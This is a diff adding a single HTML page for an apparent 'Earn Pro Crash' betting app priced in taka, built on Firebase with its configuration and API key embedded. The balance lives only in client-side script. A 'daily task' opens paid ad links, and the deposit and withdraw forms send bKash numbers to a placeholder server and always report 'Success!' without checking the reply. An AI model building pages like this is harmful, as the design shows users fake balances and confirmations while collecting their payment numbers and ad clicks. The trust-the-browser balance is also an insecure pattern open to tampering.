@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Earn Pro Crash</title>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
+    <style>
+        body { background: #0b0e11; color: white; font-family: sans-serif; text-align: center; margin: 0; }
+        .game-box { background: #1e2329; padding: 30px; border-radius: 0 0 25px 25px; border-bottom: 5px solid #f39c12; }
+        #multiplier { font-size: 4rem; color: #f39c12; margin: 15px 0; }
+        .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 20px; }
+        input { padding: 15px; border-radius: 8px; border: none; background: #2b3139; color: white; grid-column: span 2; margin-bottom: 5px; }
+        button { padding: 15px; border-radius: 8px; border: none; font-weight: bold; cursor: pointer; color: white; }
+        .btn-bet { background: #02c076; grid-column: span 2; }
+        .btn-cash { background: #f39c12; color: black; grid-column: span 2; display: none; }
+        .btn-task { background: #e02424; }
+        .btn-side { background: #474d57; }
+        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 99; padding-top: 50px; }
+    </style>
+</head>
+<body>
+    <div class="game-box">
+        <h3>Balance: ৳<span id="bal">50.00</span></h3>
+        <div id="status">Waiting...</div>
+        <div id="multiplier">1.00x</div>
+    </div>
+    <div class="controls">
+        <input type="number" id="bet-amt" placeholder="Bet Amount (Min 10)">
+        <button id="bet-btn" class="btn-bet" onclick="placeBet()">PLACE BET</button>
+        <button id="cash-btn" class="btn-cash" onclick="cashOut()">CASH OUT</button>
+        <button class="btn-side" onclick="openPop('dep')">DEPOSIT</button>
+        <button class="btn-side" onclick="openPop('with')">WITHDRAW</button>
+        <button class="btn-task" onclick="doTask()">DAILY TASK (<span id="tc">0</span>/40)</button>
+        <button class="btn-side" onclick="copyRef()">REFER</button>
+    </div>
+    <div id="modal" class="modal">
+        <div style="background:#1e2329; width:80%; margin:auto; padding:20px; border-radius:10px;">
+            <h3 id="m-title"></h3>
+            <div id="m-body"></div>
+            <br>
+            <button onclick="document.getElementById('modal').style.display='none'">Close</button>
+        </div>
+    </div>
+<script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyBTu-63HAarfY0w2BZYFldwbPAxgIEIm8c",
+        authDomain: "earn-pro-5d8a8.firebaseapp.com",
+        databaseURL: "https://earn-pro-5d8a8-default-rtdb.firebaseio.com",
+        projectId: "earn-pro-5d8a8",
+        storageBucket: "earn-pro-5d8a8.firebasestorage.app",
+        messagingSenderId: "1090324824300",
+        appId: "1:1090324824300:web:ce2815eee7837856fee5c9"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    let balance = 50.0; let betAmt = 0; let hasBet = false; let tasks = 0;
+    const RENDER_URL = "https://your-app-name.onrender.com";
+
+    db.ref('game_state').on('value', (s) => {
+        const data = s.val();
+        document.getElementById('multiplier').innerText = data.multiplier + "x";
+        document.getElementById('status').innerText = data.status === 'waiting' ? `Starting in ${data.timer}s` : "Flying...";
+        if(data.status === 'flying' && hasBet) document.getElementById('cash-btn').style.display = 'block';
+        if(data.status === 'crashed') { 
+            document.getElementById('multiplier').style.color = 'red';
+            hasBet = false; document.getElementById('cash-btn').style.display = 'none';
+        } else { document.getElementById('multiplier').style.color = '#f39c12'; }
+    });
+
+    function placeBet() {
+        const a = parseFloat(document.getElementById('bet-amt').value);
+        if(a >= 10 && a <= balance) { balance -= a; betAmt = a; hasBet = true; document.getElementById('bal').innerText = balance.toFixed(2); }
+    }
+    function cashOut() {
+        if(!hasBet) return;
+        balance += (betAmt * parseFloat(document.getElementById('multiplier').innerText));
+        hasBet = false; document.getElementById('bal').innerText = balance.toFixed(2);
+        document.getElementById('cash-btn').style.display = 'none';
+    }
+    function doTask() {
+        const url = tasks % 2 === 0 ? "https://otieu.com/4/10315373" : "https://www.effectivegatecpm.com/e0xpfuhe?key=fb81fa455f0ff2d6a8fa09ce5d18dd57";
+        window.open(url, '_blank');
+        setTimeout(() => { tasks++; document.getElementById('tc').innerText = tasks; if(tasks===40) { balance+=10; document.getElementById('bal').innerText = balance.toFixed(2); } }, 20000);
+    }
+    function openPop(t) {
+        document.getElementById('modal').style.display='block';
+        document.getElementById('m-title').innerText = t === 'dep' ? 'Deposit' : 'Withdraw';
+        document.getElementById('m-body').innerHTML = `<input id="p-num" placeholder="Number"><input id="p-amt" placeholder="Amount"><button style="background:#02c076" onclick="subReq('${t}')">Submit</button>`;
+    }
+    async function subReq(t) {
+        const num = document.getElementById('p-num').value;
+        const amt = document.getElementById('p-amt').value;
+        await fetch(`${RENDER_URL}/request`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({type: t, userId: 'User', amount: amt, method: 'Bkash', number: num})
+        });
+        alert("Success!");
+        document.getElementById('modal').style.display='none';
+    }
+    function copyRef() { alert("Link: https://t.me/yourbot?start=123"); }
+</script>
+</body>
+      </html>
